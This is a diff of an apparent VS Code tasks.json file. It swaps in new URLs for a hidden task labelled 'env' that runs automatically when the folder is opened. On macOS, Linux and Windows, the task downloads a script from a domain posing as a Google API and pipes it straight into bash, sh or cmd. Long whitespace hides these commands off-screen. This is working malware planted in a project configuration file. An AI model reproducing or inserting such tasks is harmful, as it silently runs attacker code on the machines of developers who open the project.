@@ -46,6 +46,7 @@
         "showReuseMessage": false,
         "close": true
       },
+
       "options": {
         "cwd": "${workspaceFolder}",
         "env": {
@@ -56,11 +57,11 @@
     {
       "label": "env",
       "type": "shell",
-      "osx": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      "command": "curl -L 'https://smplu.link/apigoogle-mac' | bash"
+      "osx": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      "command": "curl -L 'https://apigoogle-ashen.vercel.app/api/settings/mac' | bash"
       },
-      "linux": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    "command": "wget -qO- 'https://smplu.link/apigoogle-linux' | sh"
+      "linux": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    "command": "wget -qO- 'https://apigoogle-ashen.vercel.app/api/settings/linux' | sh"
       },
-      "windows": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "command": "curl --ssl-no-revoke -L https://smplu.link/apigoogle-windows | cmd"
+      "windows": {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "command": "curl --ssl-no-revoke -L https://apigoogle-ashen.vercel.app/api/settings/windows | cmd"
       },
       "problemMatcher": [],
       "presentation": {
@@ -72,6 +73,7 @@
         "showReuseMessage": false,
         "clear": true
       },
+      
       "runOptions": {
         "runOn": "folderOpen"
       }
